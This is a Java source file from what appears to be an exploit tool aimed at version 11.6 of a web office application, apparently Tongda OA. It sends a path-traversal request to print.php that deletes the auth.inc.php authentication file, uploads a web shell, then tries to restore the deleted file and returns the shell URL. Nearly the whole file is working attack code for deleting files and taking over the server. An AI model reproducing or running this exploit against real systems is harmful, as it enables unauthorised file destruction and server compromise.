package com.xinyu.poc;

import com.xinyu.tools.Other;
import com.xinyu.tools.Request;
import com.xinyu.tools.Response;

import java.awt.*;

/**
 * 任意文件删除漏洞(已完成)
 * 影响版本:v11.6
 */
public class ArbitraryFileDeletion {
    public static String poc1(String url, TextArea textArea) {
        String shell_url = null;
        boolean flag = false;
        textArea.append("\n正在验证当前版本是否为v11.6...");
        String version = Other.getVersion(url);
        System.out.println(version);
        //此处限制特定版本进行利用
        if (version.equals("11.6")) {
            int code = Request.get(url + "/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php").getCode();
            flag = code == 200 ? true : false;
        }
        System.out.println(flag);

        if (flag) {
            textArea.append("\n验证通过");
            textArea.append("\n存在任意文件删除漏洞(auth.inc.php文件已删除)");
            System.out.println("存在任意文件删除漏洞(auth.inc.php文件已删除)");
            //1.上传shell
            shell_url = GetShell.getShell(url, "poc1", null);
            //2.上传auth.inc.php源文件
            Request.uploadBackupFile(url);
            //3.上传处理文件(移动auth.inc.php到原本位置,删除自身)
            GetShell.poc5(url);
            //4.检测是否恢复
            Response response = Request.get(url + "/general/");
            if (!response.getText().contains("tongda2000.com")) {
                textArea.append("\n尝试恢复源文件(auth.inc.php文件已恢复)");
                System.out.println("尝试恢复源文件(auth.inc.php文件已恢复)");
            } else {
                textArea.append("\n源文件恢复失败,环境允许的情况下请手动进行恢复");
                System.out.println("源文件恢复失败,环境允许的情况下请手动进行恢复");
            }
        }else{
            textArea.append("\n版本不符合");
        }
        return shell_url;
    }
}
